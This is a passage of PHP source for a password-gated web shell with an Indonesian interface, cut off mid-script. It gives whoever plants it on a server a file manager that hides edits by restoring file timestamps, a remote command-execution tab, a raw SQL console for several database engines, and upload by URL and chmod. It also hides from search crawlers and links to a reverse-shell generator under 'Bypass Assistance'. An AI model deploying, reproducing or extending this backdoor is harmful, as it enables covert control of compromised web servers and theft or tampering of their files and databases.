					$db = new DatabaseManager($contype, $sqlhost, $sqluser, $sqlpass, $sqldata);
					$result = $db->query($showdb);
					while ($row = $db->fetchRow($result)){
						$dblists[] = "<option value='{$row['Database']}' data-connect='".base64_encode(json_encode(array($contype, $sqlhost, $sqluser, (!empty($sqlpass)?$sqlpass:null), $row['Database'])))."'>{$row['Database']}</option>";
					}
					$dtTable = "<hr class='mt-n1' style='background-color:var(--cyan);'/><div class='row mb-3' id='sqlmanager'>
						<div class='col-sm-3 col-md-3 col-lg-3'>
							<div class='form-group mb-3'>
								<label for='dblists' class='mb-1'>Database:</label>
								<select class='custom-select custom-select-sm border-success' id='dblists'>".(isset($dblists) ? implode('',$dblists) : '')."</select>
							</div>
							<div class='table-responsive text-nowrap mb-3' id='dbshowtable'>
								<table class='table table-sm fixed_listdbtable w-100 mb-0'>
									<thead class='bg-dark text-light'>
										<tr><th class='pl-2'>Tables</th></tr>
									</thead>
									<tbody id='listdbtables'></tbody>
								</table>							
							</div>
						</div>
						<div class='col-sm-9 col-md-9 col-lg-9'>
							<div class='sqltabpanel'>
								<form method='post' action='?act=sql&q=manage'>
									<input type='hidden' name='sqlconnect' value='' />
									<input type='hidden' name='sqlgetdata' value='' />
									<div class='form-group mb-3'>
										<label for='sqlquery' class='mb-1'>SQL Query:</label>
										<div class='input-group'>
											<textarea name='sqlquery' id='sqlquery' class='form-control form-control-sm border-success' rows='1'></textarea>
											<div class='input-group-append'><button class='btn btn-sm btn-outline-success' type='submit'>Go</button></div>
										</div>
									</div>
									<div class='input-group input-group-sm mb-3 d-none' id='flimit'>
										<div class='input-group-prepend'><span class='input-group-text'>Limit</span></div>
										<input type='text' name='slimit' class='form-control form-control-sm border-success' value='0' onkeyup='this.value = this.value.replace(/[^0-9]/g, \"\");' />
										<div class='input-group-prepend'><span class='input-group-text'>rows</span></div>
										<select name='elimit' class='custom-select custom-select-sm border-success'>
											<option value='25'>25</option>
											<option value='50'>50</option>
											<option value='75'>75</option>
											<option value='100'>100</option>
											<option value='150'>150</option>
											<option value='200'>200</option>
										</select>
										<div class='input-group-append'><button class='btn btn-sm btn-outline-success' type='submit'>Go</button></div>
									</div>
								</form>
							</div>
							<div class='mb-3' id='dbshowrows'></div>
						</div>
					</div>";
					echo $dtTable;
				} catch (Exception $e) {
					echo $e->getMessage();
				}
				$db->close();
			}
		} else {
			if(isset($_POST)){
				$sqlconnect = json_decode(base64_decode($_POST['sqlconnect']),true);
				$sqlgetdata = isset($_POST['sqlgetdata']) && !empty($_POST['sqlgetdata']) ? $_POST['sqlgetdata'] : '';
				$sqlquery = isset($_POST['sqlquery']) && !empty($_POST['sqlquery']) ? $_POST['sqlquery'] : '';
				$slimit = isset($_POST['slimit']) && !empty(preg_replace('/[^0-9]/','',$_POST['slimit'])) ? preg_replace('/[^0-9]/','',$_POST['slimit']) : 0;
				$elimit = isset($_POST['elimit']) && !empty(preg_replace('/[^0-9]/','',$_POST['elimit'])) ? preg_replace('/[^0-9]/','',$_POST['elimit']) : 25;
				switch($sqlconnect[0]){
					case 'MySQL'	: $contype = 'mysql'; break;
					case 'PostgreSQL': $contype = 'pgsql'; break;
					case 'SQLite'	: case 'SQLite3' : $contype = 'sqlite'; break;
					case 'MSSql'	: $contype = 'mssql'; break;
					case 'Oracle'	: $contype = 'oracle'; break;
					case 'PDO'		: $contype = 'pdo'; break;
					case 'odbc'		: $contype = 'odbc'; break;
					default			: $contype = 'mysql';
				}
				$hasils = [];
				$db = new DatabaseManager($contype, $sqlconnect[1], $sqlconnect[2], ($sqlconnect[3]!=null?$sqlconnect[3]:''), $sqlconnect[4]);
				try {
					if(trim($sqlquery) || trim($sqlgetdata)){
						if(trim($sqlgetdata) != '' && (trim($sqlquery) == '' || trim($sqlquery) != '')){
							switch($contype){
								case 'mysql'	: $showrows = "SELECT * FROM `{$sqlgetdata}` LIMIT {$slimit},{$elimit};"; break;
								case 'pgsql'	: $showrows = "SELECT * FROM {$sqlgetdata} LIMIT {$elimit} OFFSET {$slimit};"; break; 
								case 'sqlite'	: $showrows = "SELECT * FROM {$sqlgetdata} LIMIT {$slimit},{$elimit};";  break;
								case 'mssql'	: $showrows = "SELECT TOP {$elimit} * FROM {$sqlgetdata};";  break;
								case 'oracle'	: $showrows = "SELECT * FROM {$sqlgetdata} WHERE ROWNUM BETWEEN {$slimit} AND {$elimit};";  break;
								case 'pdo'		: 
									$pdoDriver = $db->getConnection()->getAttribute(PDO::ATTR_DRIVER_NAME);
									switch ($pdoDriver) {
										case 'mysql'	: $showrows = "SELECT * FROM `{$sqlgetdata}` LIMIT {$slimit},{$elimit};"; break;
										case 'pgsql'	: $showrows = "SELECT * FROM {$sqlgetdata} LIMIT {$elimit} OFFSET {$slimit};"; break;
										case 'sqlite'	: $showrows = "SELECT * FROM {$sqlgetdata} LIMIT {$slimit},{$elimit};"; break;
										case 'sqlsrv'	: $showrows = "SELECT TOP {$elimit} * FROM {$sqlgetdata};"; break;
										case 'oci'		: $showrows = "SELECT * FROM {$sqlgetdata} WHERE ROWNUM BETWEEN {$slimit} AND {$elimit};"; break;
										default			: throw new Exception("Unsupported PDO driver: {$pdoDriver}");
									}
								break;
								case 'odbc'	: $showrows = "SELECT * FROM `{$sqlgetdata}` LIMIT {$slimit},{$elimit};";  break;
								default		: $showrows = "SELECT * FROM `{$sqlgetdata}` LIMIT {$slimit},{$elimit};";
							}
						} else if(trim($sqlquery) != '' && (trim($sqlgetdata) == '' || trim($sqlgetdata) != '')){
							$showrows = $sqlquery;
						}
						$resrows = $db->query($showrows);
						if($resrows){
							if(!is_bool($resrows)){
								if($db->numRows($resrows) > 0){
									while ($row = $db->fetchRow($resrows)){
										$hasils[] = $row;
									}
								} else {
									$fieldInfo = $db->getFieldInfo($resrows);
									$hasils[] = array_fill_keys($fieldInfo['field_names'], '-');;
								}
							} else {								
								$hasils[] = ["query" => "Affected Rows: " . $db->affectedRows($showrows)];
							}
						}
					} else {
						switch($contype){
							case 'mysql'	: $showtbl = "SHOW TABLES FROM `{$sqlconnect[4]}`"; break;
							case 'pgsql'	: $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='{$sqlconnect[4]}'"; break;
							case 'sqlite'	: $showtbl = "SELECT name FROM sqlite_master WHERE type='table'"; break;
							case 'mssql'	: $showtbl = "SELECT name FROM {$sqlconnect[4]}.sysobjects WHERE xtype = 'U'"; break;
							case 'oracle'	: $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='{$sqlconnect[4]}'"; break;
							case 'pdo'		: 
								$driver = $db->getConnection()->getAttribute(PDO::ATTR_DRIVER_NAME);
								switch ($driver) {
									case 'mysql'	: $showtbl = "SHOW TABLES FROM `{$sqlconnect[4]}`"; break;
									case 'pgsql'	: $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema = '{$sqlconnect[4]}'"; break;
									case 'sqlite'	: $showtbl = "SELECT name FROM sqlite_master WHERE type='table'"; break;
									case 'sqlsrv'	: $showtbl = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"; break;
									case 'oci'		: $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES"; break;
									default			: throw new Exception("Unsupported PDO driver: {$driver}");
								}
							break;
							case 'odbc'		: $showtbl = "SHOW TABLES"; break;
							default			: $showtbl = "SHOW TABLES FROM `{$sqlconnect[4]}`";
						}
						$result = $db->query($showtbl);
						if($result && $result->num_rows > 0){
							while ($row = $db->fetchRow($result)){
								foreach($row as $s_tables){
									$hasils[$s_tables][] = $s_tables;
								}
							}
						}
					}					
					echo json_encode($hasils);
				} catch (Exception $e) {
					echo $e->getMessage();
				}
				$db->close();
			}
		}
		die();
} else if($_GET['act'] == 'path'){
		$_SESSION['path'] = isset($_GET['dir']) && !empty($_GET['dir']) ? $_GET['dir'] : $_SESSION['path'];
		if(isset($_GET['opt'], $_GET['entry'])){
			$df = $_SESSION['path'] .'/'. $_GET['entry'];
			if($_GET['opt'] == 'newfile'){
				$xdata = isset($_POST['xdata']) ? base64_decode($_POST['xdata']) : '';
				if(AvFunc(array('fopen','fwrite','fclose'))){
					$fp = @fopen($df, 'w');
					if($fp){
						@fwrite($fp, $xdata);
						@fclose($fp);
						$dout = "{$_GET['entry']} berhasil dibuat!";
					} else {
						$dout = "{$_GET['entry']} gagal dibuat!";
					}
				} else if(AvFunc(array('file_put_contents'))){
					file_put_contents($df, $xdata);
					$outs = file_exists($df) ? "{$_GET['entry']} berhasil dibuat!" : "{$_GET['entry']} gagal dibuat!";
				} else {
					$outs = "{$_GET['entry']} gagal dibuat!";
				}
			} else if($_GET['opt'] == 'edit'){
				if(isset($_POST['xdata'])){
					$_POST['xdata'] = base64_decode($_POST['xdata']);
					$time = @filemtime($df);
					if(AvFunc(array('fopen','fwrite','fclose'))){
						$fp = @fopen($df, 'w');
						if($fp){
							@fwrite($fp, $_POST['xdata']);
							@fclose($fp);
							@touch($df, $time, $time);
							$dout = "{$_GET['entry']} berhasil di-edit!";
						} else {
							$dout = "{$_GET['entry']} gagal di-edit!";
						}
					} else if(AvFunc(array('file_put_contents'))){
						file_put_contents($df, $_POST['xdata']);						
						@touch($df, $time, $time);
						$dout = file_exists($df) ? "{$_GET['entry']} berhasil di-edit!" : "{$_GET['entry']} gagal di-edit!";
					} else {
						$dout = "{$_GET['entry']} tidak dapat di-edit!";
					}
				} else {
					if(!is_writable($df)){
						$dout = "Disini gk bisa edit file/direktori!";
					} else {
						if(AvFunc(array('fopen','fread','fclose'))){
							$filesize = @filesize($df);
							$fp = @fopen($df, 'r');
							if($fp){
								$dout = "";
								while(!@feof($fp)){$dout .= htmlspecialchars(@fread($fp, $filesize>0?$filesize:8192));}
								@fclose($fp);
							}
						} else{
							$dout = "Gagal edit {$_GET['entry']}!";
						}
					}
				}
			} else if($_GET['opt'] == 'download'){
				if(isset($_GET['dir'], $_GET['entry'])){
					$df = $_GET['dir'] .'/'. $_GET['entry'];
					if(@is_file($df) && @is_readable($df)){
						header('Pragma: public');
						header('Expires: 0');
						header('Cache-Control: must-revalidate, post-check=0, pre-check=0'); 
						header('Content-Type: application/force-download');
						header('Content-Type: application/download');
						header('Content-Type: '.(function_exists('mime_content_type') ? @mime_content_type($df) : 'application/octet-stream'));
						header('Content-Description: File Transfer');
						header('Content-Disposition: attachment; filename='.basename($df));
						header('Content-Length: '.@filesize($df));
						header('Content-Transfer-Encoding: binary');
						$fp = @fopen($df, 'r');
						if($fp){
							while(!@feof($fp)) echo @fread($fp, @filesize($df));
							fclose($fp);
						}
						exit();
					} else {
						echo "File tidak dapat di download!'"; exit();
					}
				} else {
					echo "Tidak ada file yang dipilih!"; exit();
				}
			} else {
				$dout = '';
				if(@filesize($df)>0){
					if(AvFunc(array('fopen','fread','fclose'))){
						$fp = @fopen($df, 'r');
						if($fp){
							while(!@feof($fp)){$dout .= htmlspecialchars(@fread($fp, @filesize($df)));}
							@fclose($fp);
						}
					} else if(AvFunc(array('file_get_contents'))){
						$dout .= @file_get_contents($df);
					} else {
						$dout .= "{$_GET['entry']} ini gak bisa dibaca!";
					}
				} else {
					if(AvFunc(array('file_get_contents'))){
						$dout .= @file_get_contents($df);
					}
				}
			}
			echo $dout;
		} else {
			echo base64_encode(FManager($_SESSION['path']));
		}
		die();
	} else if($_GET['act'] == 'logout'){
		unset($_SESSION['auth'], $_SESSION['path']);
		header('location: '.$_SERVER['PHP_SELF']);
		exit();
	}
}
blockCrawler();
if (isset($_POST['xpass'])) {
    if (password_verify($_POST['xpass'], $auth_pass)) {
        $_SESSION['auth'] = $auth_pass;
        $_SESSION['path'] = $lokasiberkas;
        // Regenerate session ID to prevent session fixation
        session_regenerate_id(true);
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $statusLogin[] = 'Wrong password :(';
    }
}
if(!isset($_SESSION['auth'])){
	echo "<html>
		<head><meta name='viewport' content='width=device-width, initial-scale=1, shrink-to-fit=no'/>
		<link rel='shortcut icon' href='".fType('logo')."'/><title>Restricted area</title>
		<link rel='preconnect' href='https://fonts.googleapis.com'/>
		<link rel='preconnect' href='https://fonts.gstatic.com' crossorigin/>
		<link href='https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap' rel='stylesheet'/>
		<style>
		html,body{background-color:#2b2f34;}
		body{margin:0 auto; position:relative; color:#cecece; font-family:\"Ubuntu Mono\", monospace; font-size:1em; background-image:url('https://cdn.svgator.com/images/2022/06/use-svg-as-background-image-particle-strokes.svg'); background-position:bottom center; background-repeat:no-repeat; background-size:cover; object-fit:cover;}
		fieldset{background-color:#343a40; border-radius:.3em; border:.5px solid #1e7400; padding-bottom:17.5px;}
		fieldset>div{position:absolute; bottom:0; top:35; left:78%; transform:translate(-50%,50%);}
		legend,input[type='submit'],input[type='password']{background-color:#1e7400; padding:5px 10px; border-radius:.3em;box-sizing:border-box; transition: 0.5s;}
		legend,input[type='submit'],input[type='password']:focus{border:1px solid #32c200;}
		input[type='submit']{margin:5px; border:0; color:#cecece;}
		input[type='password']{background-color:#2b2f34!important; color:#cecece; margin:5px; border:.5px solid #1e7400; outline:none;}
		.pfom{position:absolute; top:50%; left:50%; transform:translate(-50%,-50%);}
		</style>
		</head>
		<body>
			<div class='pfom'>
				<form action='' method='post'>
					<fieldset>
						<legend>Auth</legend>
						<input type='password' name='xpass'></input>
						<div><input type='submit' value='login'></input></div>
						".(isset($statusLogin) ? "<br/><small style='font-style:italic;'>{$statusLogin[0]}</small>" : "")."
					</fieldset>
				</form>
			</div>
		</body>
	</html>";
	die();
} else {
?>
<!doctype html>
<html lang="en" class="bg-dark h-100">
	<head>
		<meta charset="utf-8"/>
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
		<link rel="shortcut icon" href="<?php echo fType('logo');?>"/>
		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css" integrity="sha256-+IZRbz1B6ee9mUx/ejmonK+ulIP5A5bLDd6v6NHqXnI=" crossorigin="anonymous">
		<title><?php echo $stitle;?></title>
		<style>@import url(https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap);:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0, 212, 51;--bs-danger-rgb:220, 53, 69}::-webkit-scrollbar-track{border-radius:6px;background-color:#2b2f34}::-webkit-scrollbar{width:6px;height:4px}::-webkit-scrollbar-thumb{border-radius:6px;-webkit-box-shadow:inset 0 0 4px #000;background-color:var(--bg-icon)}body,html,pre{font-family:"Ubuntu Mono",monospace;transition:font-size .3s ease-in}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}body{font-size:1em;padding-top:4rem;color:#ddd;transition:font-size .3s ease-in}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input,textarea,select{font-size:1em!important;transition:all .3s ease-in;outline:none}input:focus,textarea:focus,select:focus{box-shadow:none!important}nav .nav-tabs{border-bottom:1px solid #00a6c0}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(0,0,0,3%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table tfoot th{padding:5px 10px!important;background:rgb(var(--bs-success-rgb),20%);border-top:2px solid var(--bg-success)!important;border-bottom:0 solid #eee!important}table tbody tr td:last-child{padding-right:0}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}table tfoot tr th:first-child{border-bottom-left-radius:.25rem}table tfoot tr th:last-child{border-bottom-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:background .3s ease-in}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.table-responsive{border-radius:.5em}.fixed_listdbtable tbody{display:inline-grid;overflow:auto;max-height:260px;height:100%;width:100%;border-bottom:1px solid var(--success)!important}.breadcrumb{background:linear-gradient(170deg,rgb(var(--bs-success-rgb),20%),transparent);padding:4px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}pre{font-size:1em;border:0!important;color:#cfdce8!important;transition:font-size .3s ease-in;height:auto;max-height:500px}.form-control-sm{height:auto}select:disabled,textarea:disabled{background-color:#272c31!important}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .75em 0 0}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),10%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}select,textarea{background-color:#343a40!important;color:#cfdce8!important}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"Upload";color:var(--success);background:#2b2f34}.custom-control-label::before{background-color:#343a40;border:2px solid var(--success)}.custom-control-input:checked~.custom-control-label::before{border-color:var(--success);background-color:var(--success)}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important}.text-cyan{color:var(--cyan)!important;color:#eee}.toast.show{margin-top:40px!important}.spinner-icon{display:inline-block;margin-right:.5em;height:1.5em;width:1.5em;background-image:url('data:image/svg+xml,<?php echo rawurlencode(fType('loader'));?>');background-repeat:no-repeat;background-size:contain;transform-origin:center;animation:spinners .75s infinite linear}@keyframes spinners{100%{transform:rotate(360deg)}}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important;transition:font-size .3s ease-in}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important;transition:font-size .3s ease-in}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
	</head>
	<body>
		<header class="header bg-dark fixed-top mt-auto py-1">
			<div class="container my-2">
				<a href="<?php echo $_SERVER['PHP_SELF'];?>" class="text-light text-decoration-none"><img src="<?php echo fType('logo');?>" class="mr-2" style="width:20px;"/><?php echo $stitle;?></a>
				<div class="d-block float-right">
					<a href="?act=logout"><?php echo fType('out','1em');?></a>
				</div>
			</div>
		</header>
		<div class="container">
			<nav>
				<div class="nav nav-tabs nav-justified" id="nav-tab" role="tablist">
					<button class="nav-link d-flex justify-content-center align-items-center active" id="fmanager" data-toggle="tab" data-target="#nav-berkas" data-tempdir="<?php echo $_SESSION['path'];?>" type="button" role="tab" aria-controls="nav-berkas" aria-selected="true">
						<?php echo fType('dir','1.2em');?><span class="d-none d-sm-block ml-2">Files</span>
					</button>
					<button class="nav-link d-flex justify-content-center align-items-center" data-toggle="tab" data-target="#nav-cmd" type="button" role="tab" aria-controls="nav-cmd" aria-selected="false">
						<?php echo fType('cmd','1em');?><span class="d-none d-sm-block ml-2">Command</span>
					</button>
					<button class="nav-link d-flex justify-content-center align-items-center" data-toggle="tab" data-target="#nav-sql" type="button" role="tab" aria-controls="nav-sql" aria-selected="false">
						<?php echo fType('sql','1.2em');?><span class="d-none d-sm-block ml-2">Sql</span>
					</button>
					<button class="nav-link d-flex justify-content-center align-items-center" data-toggle="tab" data-target="#nav-info" type="button" role="tab" aria-controls="nav-info" aria-selected="false">
						<?php echo fType('info','1.2em');?><span class="d-none d-sm-block ml-2">Info</span>
					</button>
				</div>
			</nav>
			<div class="tab-content mt-3" id="nav-tabContent">
				<div class="tab-pane show active fade" id="nav-berkas" role="tabpanel">
					<div class="form-row">
						<div class='col-12 mb-n3'>
							<div class="row mb-3" id="fberkas">
								<?php
								$drives = "";
								if($GLOBALS['os'] == 'win'){
									foreach(range('C','Z') as $drive){
										if(@is_dir($drive.':\\')){
											$drives .= '<a href="javascript:void(0);" id="chdrive" data-path="'.$drive.':/" class="text-light font-weight-bold">[ '.$drive.' ]</a> ';
										}						
									}
									echo "<div class='col-12 mt-n2 mb-2 text-success'><small>Drives: ".$drives."</small></div>";
								}?>
							</div>
						</div>
						<div class="col-12"><div class="row" id="fileman"></div></div>
					</div>
				</div>
				<div class="tab-pane fade" id="nav-cmd" role="tabpanel">
					<div class="row" style="margin-top:-7.5px;">
						<div class="col-12">
							<span>Command execute</span>
							<form method="post" action="?act=command" class="mb-3" id="rqcmd">
								<input type="hidden" name="xpath" value=""></input>
								<div class="input-group mt-2">
									<input type="text" class="form-control form-control-sm border-success" name="cmd" placeholder="uname -a"></input>
									<div class="input-group-append"><button class="btn btn-sm btn-outline-success" type="submit">Go</button></div>
								</div>
							</form>
						</div>
						<div class="col-12" id="hasilcommand"></div>
						<div class="col-12">
							<span>Bypass Assistance:</span>
							<ul class="ml-n4">
								<li><a href="https://www.revshells.com/" target="_blank" class="text-cyan">Reverse shell generator</a></li>
							</ul>
						</div>
					</div>
				</div>
				<div class="tab-pane fade" id="nav-sql" role="tabpanel">
					<div class="row" style="margin-top:-7.5px;">
						<div class="col-12" id="showsqlframe"></div>
					</div>
				</div>
				<div class="tab-pane fade" id="nav-info" role="tabpanel">
					<div class="row">
						<div class="col-12" id="showinfo"></div>
					</div>
				</div>
			</div>
		</div>
		<div class="position-fixed top-0 right-0 p-3" id="shownotif" style="z-index:1031; right:0; top:-40px;"></div>
		<div class="modal fade" id="uploadtypefile" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content bg-dark">
					<div class="modal-header bg-dark border-secondary">
						<h6 class="modal-title text-break text-light" id="staticBackdropLabel">Upload file <span class="d-block mt-n1" style="font-size:11px;">from: local storage</span></h6>
						<button type="button" class="close text-light" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body">
						<form method="post" action="?act=upload" id="rqupload">
							<input type="hidden" name="xpath" value=""/>
							<div class="input-group">
								<div class="custom-file">
									<label class="custom-file-label" for="titupl">Choose files</label>
									<input type="file" name="xfile[]" class="custom-file-input border-success" id="titupl" aria-describedby="upld" multiple></input>
								</div>
							</div>
						</form>
						<div class="mt-2 small text-warning text-center font-italic">available multiple files</div>
					</div>
				</div>
			</div>
		</div>
		<div class="modal fade" id="uploadtypeurl" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content bg-dark">
					<div class="modal-header bg-dark border-secondary">
						<h6 class="modal-title text-break text-light" id="staticBackdropLabel">Upload file <span class="d-block mt-n1" style="font-size:11px;">from: url</span></h6>
						<button type="button" class="close text-light" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body">
						<form method="post" action="?act=uploader" id="rquploader">
							<input type="hidden" name="xpath" value=""></input>
							<div class="input-group mb-3">
								<div class="input-group-prepend"><label class="input-group-text">Link</label></div>
								<input type="text" class="form-control border-success" id="xurl" name="xurl" value=""/>
							</div>
							<div class="input-group">
								<div class="input-group-prepend"><label class="input-group-text">Name</label></div>
								<input type="text" class="form-control border-success" id="xname" name="xname" value=""/>
								<div class="input-group-append">
									<button class="btn btn-outline-success" type="submit">GO</button>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>
		</div>
		<div class="modal fade" id="modalshowaksi" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content bg-dark">
					<div class="modal-header bg-dark border-secondary">
						<h5 class="modal-title text-break text-light" id="staticBackdropLabel">title</h5>
						<button type="button" class="close text-light" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body"></div>
					<div class="modal-footer d-flex justify-content-center"></div>
				</div>
			</div>
		</div>
		<div class="modal fade" id="showchmod" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
				<div class="modal-content bg-dark">
					<div class="modal-header bg-dark border-secondary">
						<h5 class="modal-title text-break text-light" id="staticBackdropLabel">Change permissions</h5>
						<button type="button" class="close text-light" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
					</div>
					<div class="modal-body">
						<form method="post" action="?act=chmod" id="rqchmod">
							<input type="hidden" name="xtype" value=""></input>
							<input type="hidden" name="xname" value=""></input>
							<input type="hidden" name="xpath" value=""></input>
							<div class="form-group row">
								<label for="xname" class="col-sm-2 col-form-label">File</label>
								<div class="col-sm-10">
									<input type="text" class="form-control border-success" id="xname" readonly="readonly" value="" max-length="4"/>
								</div>
							</div>
							<div class="form-group row mb-0">
								<label for="xperm" class="col-sm-2 col-form-label">Permission</label>
								<div class="col-sm-10">
									<div class="input-group mb-3">
										<input type="text" class="form-control border-success" id="xperm" name="xperm" value=""/>
										<div class="input-group-append">
											<button class="btn btn-outline-success" type="submit">GO</button>
										</div>
									</div>
								</div>
							</div>
						</form>
					</div>
				</div>
			</div>			
		</div>
		<footer class="footer bg-dark mt-auto py-2">
			<div class="container">
				<blockquote class="blockquote text-center mb-0">
					<span class="text-secondary small"><?php echo $sfooter;?></span>
				</blockquote>
			</div>
		</footer>
		<script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js" integrity="sha256-GRJrh0oydT1CwS36bBeJK/2TggpaUQC6GzTaTQdZm0k=" crossorigin="anonymous"></script>		
		<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.37.1/src-min/ace.js" integrity="sha256-j0T2ePXwSG4TgRsN7jKuuvUMRDcSJc997KCJSv9/TNk=" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.37.1/src-min/mode-php.js" integrity="sha256-3rHEdQQv0mscER3N8IrS1V3jZzlk45R1Uu8UIQqf6uE=" crossorigin="anonymous"></script>
		<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.37.1/src-min/theme-monokai.js" integrity="sha256-2KFkudTravG9kVvHM2WLJvWzr90TX+DGc6T2QxoG1k8=" crossorigin="anonymous"></script>
		<script type="text/javascript">!function(t){let e='<div class="mb-3 bg-transparent d-flex"><div class="spinner-icon"></div>Tunggu bentar...</div>',a={bs64ToBit:function(t){let e=atob(t);return Uint8Array.from(e,t=>t.codePointAt(0))},btTobs64:function(t){let e=String.fromCodePoint(...t);return btoa(e)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(e){return!1}},encode:function(t){return a.isWellFormed(t)?a.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return a.isWellFormed(t)?new TextDecoder().decode(a.bs64ToBit(t)):""}},n=(e,a)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="5000"><div class="toast-header"><img src="<?php echo fType('logo');?>" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+e+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+a+"</div></div>"),t(".toast").toast("show")};function o(t){try{return JSON.parse(t)&&!!t}catch(e){return!1}}function i(e,a){let n='<table class="table table-sm w-100 mb-0"><thead class="bg-dark text-light"><tr>';return a.forEach(t=>{n+='<th class="pl-2">'+t+"</th>"}),n+="</tr></thead><tbody>",e.forEach(t=>{n+="<tr>",a.forEach(e=>{let a="-";if(void 0!==t[e]&&""!=t[e]){var o;a=null!=(o=t[e])?o.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#39;").replace(/\n/g,"<br/>"):null}n+='<td class="pl-2">'+a+"</td>"}),n+="</tr>"}),t(n+="</tbody></table>")}function d(a,o,i,d){var s=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+o+"&entry="+i+"&opt="+a,beforeSend:function(){s.html(e)}}).done(function(t){s.html(""),d(t)}).fail(function(t,e,a){n("Error",t.status),s.html("error_code: "+t.status)})}function s(e){for(var 